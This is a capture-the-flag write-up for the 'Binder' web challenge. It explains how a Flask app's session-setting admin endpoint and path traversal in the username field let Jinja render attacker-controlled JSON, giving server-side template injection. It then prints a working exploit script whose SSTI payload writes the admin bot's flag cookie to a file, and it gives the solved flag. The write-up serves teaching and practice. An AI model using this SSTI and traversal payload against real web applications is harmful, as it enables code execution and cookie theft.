## Binder  

<img src="images/chall.png" width=600>

The webpage allows us to register an account with `username` and `description` fields which will be rendered on our profile page.  

```python
@app.route("/profile")
def profile():
    uuid = session["uuid"]
    user_data = fetch_details(uuid)
    if user_data is None:
        return redirect('/register')
    username,description,dev_options = user_data["username"],user_data["description"],user_data["dev_options"]
    if user_data is None:
        return better_render_template("default_pages/error.html",context={"error":"Create an Account First!"})
    return better_render_template(f"user_pages/{uuid}/{username}",dev_options)

@app.route("/register",methods=["POST","GET"])
def register():
    uuid = session["uuid"]
    if request.method == "GET":
        return better_render_template("default_pages/register.html")
    if request.method == "POST":
        description = request.form.get('description')
        username = request.form.get('username')
        dev_options = request.form.get("dev_options","{}")
        if dev_options:
            dev_options = json.loads(dev_options)
        if not username or not description:
            return better_render_template("default_pages/error.html",context={"error":"All fields are required!"})
        print(f"Registering user {username} with uuid {uuid}")        
        delete_user_pages(uuid)
        insert_details(uuid,username,description,dev_options)
        create_user_page(uuid,username,description)
        return redirect('/profile')
```

However, the creation of the profile page encodes the `username` and `description` fields to binary, so traditional SSTI won't work.  

```python
def to_bin(data):
    return ''.join(format(ord(char), '08b') for char in data)

def better_render_template(filename,dev_options={},context={}):
    with open(filename) as file:
        template = Template(file.read(),**dev_options)
    return render_template(template,**context)

def create_user_page(uuid,username,description):
    with open("default_pages/user.html") as file:
        data = file.read()
    # Computers communicate in binary right???
    username_encoded = to_bin(username)
    description_encoded = to_bin(description)
    # Best way to block Template Injection
    data = data.replace("{username}",username_encoded)
    data = data.replace("{description}",description_encoded)
    directory = f"user_pages/{uuid}"
    file_path = f"{directory}/{username}"
    if os.path.exists(file_path):
        raise FileExistsError()
    os.makedirs(directory,exist_ok=True)
    with open(f"user_pages/{uuid}/{username}", "w") as file:
        file.write(data)
```

The backend also has an admin bot that visits the profile page with the flag cookie.  

```python
class AdminBot:
    def __init__(self, base_url, flag):
        self.base_url = base_url
        self.flag = flag
        self.driver = webdriver.Chrome(options=set_chrome_options())
        self.lock = threading.Lock()
        
    def authenticate_and_visit_admin(self,userId):
        userId = urllib.parse.quote_plus(userId)
        
        self.driver.get(f"{self.base_url}/admin?userId={userId}")
        self.driver.add_cookie({
            'name': 'flag',
            'value': self.flag,
            'path': '/',
            'httpOnly': False 
        })
        print("Flag given to admin bot for userId {}".format(userId))

    def visit_profile(self,userId):
        with self.lock:
            self.driver.delete_all_cookies()
            self.authenticate_and_visit_admin(userId)
            self.driver.get(f"{self.base_url}/profile")
            self.driver.implicitly_wait(10)
            return self.driver.title, self.driver.page_source
```

The main vulnerability in the app lies in the `/admin` endpoint, which allows us to control the session `uuid`.  

```python
@app.route("/admin")
def admin():
    userId = request.args.get("userId","")
    if not userId:
        return jsonify({"error":"No userId provided"}),400
    session['uuid'] = userId
    return jsonify({"success":True,"message":"Admin Bot Session Set"}),200
```

The `uuid` determines the write location of the account info (`username`, `description`). The `/profile` then uses the session `uuid` and the current `username` to access the account info through `user_pages/{uuid}/{username}`.  

We can set `uuid` to a known text, then abuse path traversal in `username` to get the webpage to render the JSON file instead of the binary-encoded template.  

Jinja will then parse the JSON file normally, giving us SSTI.  

```python
def insert_details(uuid, username,description,dev_options = {}):
    DB_PATH = f"data/{uuid}.json"
    with open(DB_PATH, "w") as file:
        json.dump({
            "username":username,
            "description":description,
            "dev_options":dev_options
        },file)

def fetch_details(uuid):
    DB_PATH = f"data/{uuid}.json"
    if not os.path.exists(DB_PATH):
        return None
    with open(DB_PATH, "r") as file:
        data =json.load(file)
    return data
...
@app.route("/profile")
def profile():
    uuid = session["uuid"]
    user_data = fetch_details(uuid)
    if user_data is None:
        return redirect('/register')
    username,description,dev_options = user_data["username"],user_data["description"],user_data["dev_options"]
    if user_data is None:
        return better_render_template("default_pages/error.html",context={"error":"Create an Account First!"})
    return better_render_template(f"user_pages/{uuid}/{username}",dev_options)
```

### Unintended solve  

In my case, after I gained SSTI, I inspected the `/data` directory and realised someone had already exfiltrated the flag there in `leak.txt`.  

ts genuinely gotta be the worst unintended oat  

<img src="images/leaked.png" width=600>

### Intended solve  

The intended solve involves getting the admin bot to visit the profile page to exfiltrate the flag.  

Although CSP is enforced on the webpage, it doesn't really matter since we already have SSTI, which isn't affected by CSP.  

```python
@app.after_request
def set_secure_headers(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'; style-src 'unsafe-inline';"
    return response
```

We can then write an SSTI payload that will write the flag cookie to `/data` when visited by the admin bot, before exploiting path traversal in `username` again to access the flag leak.  

```python
DIR = 'hacked'
LEAK = 'data/exfil.txt'

s.get(f'{url}/admin', params={ 'userId': DIR })

payload = "self.__init__.__globals__.__builtins__['open']('%s','w').write(self.__init__.__globals__.__builtins__['__import__']('flask').request.cookies.get('flag',''))" % LEAK

s.post(f"{url}/register", data={
    'username': f'../../data/{DIR}.json',
    'description': '{{ %s }}' % payload,
})

s.post(f'{url}/visit')

time.sleep(3)

s.post(
    f"{url}/register",
    data={
        "username": f"../../{LEAK}",
        "description": "x",
    },
)

res = s.get(f"{url}/profile")
print(res.text)
```

Flag: `YBN25{c113n7_51d3_73mp1473_1nj3c710n???}`